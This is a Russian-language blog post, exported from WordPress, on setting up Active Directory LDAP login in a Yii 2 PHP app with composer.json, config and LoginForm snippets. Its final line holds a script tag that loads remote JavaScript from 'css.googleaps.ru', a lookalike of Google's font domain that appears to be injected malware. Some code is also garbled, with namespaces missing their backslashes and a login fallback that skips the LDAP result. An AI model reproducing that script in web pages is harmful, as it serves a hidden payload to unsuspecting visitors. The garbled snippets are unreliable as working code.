---
layout: post
status: publish
published: true
title: Yii 2 AD LDAP
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 47688
wordpress_url: http://devdocs.ru/?p=47688
date: '2015-10-06 22:29:29 +0200'
date_gmt: '2015-10-06 22:29:29 +0200'
categories:
- Новости партнеров
tags:
- php
- ip
- git
- bootstrap
- js
- ui
- yii2
- des1roer
- yii
- orm
comments: []
---
<div dir="ltr" style="text-align: left;">
<div dir="ltr" style="text-align: left;">
<pre><code>cd localhost/yii2/basic</code></pre><br />
правим composer.json<br />
добавляем</p>
<pre><code><br />
{<br />
    "name": "yiisoft/yii2-app-advanced",<br />
    "description": "Yii 2 Advanced Project Template",<br />
    "keywords": ["yii2", "framework", "advanced", "project template"],<br />
    "homepage": "http://www.yiiframework.com/",<br />
    "type": "project",<br />
    "license": "BSD-3-Clause",<br />
    "support": {<br />
        "issues": "https://github.com/yiisoft/yii2/issues?state=open",<br />
        "forum": "http://www.yiiframework.com/forum/",<br />
        "wiki": "http://www.yiiframework.com/wiki/",<br />
        "irc": "irc://irc.freenode.net/yii",<br />
        "source": "https://github.com/yiisoft/yii2"<br />
    },<br />
    "minimum-stability": "stable",<br />
    "repositories": [<br />
        {<br />
            "type": "package",<br />
            "package": {<br />
                "name": "adldap/adLDAP",<br />
                "version": "4.0.4",<br />
                "source": {<br />
                    "url": "https://github.com/adldap/adLDAP",<br />
                    "type": "git",<br />
                    "reference": "v4.0.4"<br />
                }<br />
            }<br />
        }<br />
    ],<br />
    "require": {<br />
        "php": ">=5.4.0",<br />
        "yiisoft/yii2": ">=2.0.4",<br />
        "yiisoft/yii2-bootstrap": "*",<br />
        "yiisoft/yii2-swiftmailer": "*",<br />
        "adldap/adldap": "</code><code>4.0.4 as 4.0-stable",<br />
        "edvlerblog/yii2-adldap-module": "v1.0.0"<br />
    },<br />
    "require-dev": {<br />
        "yiisoft/yii2-codeception": "*",<br />
        "yiisoft/yii2-debug": "*",<br />
        "yiisoft/yii2-gii": "*",<br />
        "yiisoft/yii2-faker": "*"<br />
    },<br />
    "config": {<br />
        "process-timeout": 1800<br />
    },<br />
    "extra": {<br />
        "asset-installer-paths": {<br />
            "npm-asset-library": "vendor/npm",<br />
            "bower-asset-library": "vendor/bower"<br />
        }<br />
    }<br />
}<br />
</code></pre><br />
</div></p>
<pre><code>composer update</code></pre><br />
видать из-за версии не можеть увидеть&nbsp; adLDAP<br />
в yii2/basic/vendor/edvlerblog/yii2-adldap-module/src/Ldap.php<br />
исправим</p>
<pre><code>use yiibaseComponent; //include YII component class<br />
//include  dirname(dirname(dirname(dirname(__FILE__)))) .'/adldap/adldap/src/adLDAP.php';&nbsp; -точно работает<br />
use Adldap/Adldap; //нет возможности проверить, но по логике должно<br />
use adLDAP; //include the adLDAP class</code></pre><br />
таким образом мы установили Wrapper для ad ldap</p>
<p>config/main (advanced) либо config/web (basic)</p>
<pre><code>'components' => [<br />
    ..... </code></pre><br />
'ldap' => [<br />
'class'=>'Edvlerblog/Ldap',<br />
'options'=> [<br />
//'ad_port' => 389,<br />
'domain_controllers' => array('AdServerName1'),<br />
'account_suffix' => '@test.lan',<br />
'base_dn' => "DC=test,DC=lan",<br />
// for basic functionality this could be a standard, non privileged domain user (required)<br />
'admin_username' => 'ActiveDirectoryUser',<br />
'admin_password' => 'StrongPassword'<br />
]<br />
]</p>
<p>...<br />
]</p>
<p>yii2/basic/models/LoginForm.php</p>
<pre><code>    public function login()<br />
    {<br />
        $authUser = Yii::$app->ldap->authenticate($this->username, $this->password);</code></pre><br />
if ($authUser)<br />
return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);</p>
<p>if ($this->validate())<br />
{<br />
return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);<br />
}<br />
return false;<br />
}</p>
<p>&nbsp;</p>
<p></div><br />
Source: des1roer.blogspot.com<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></p>
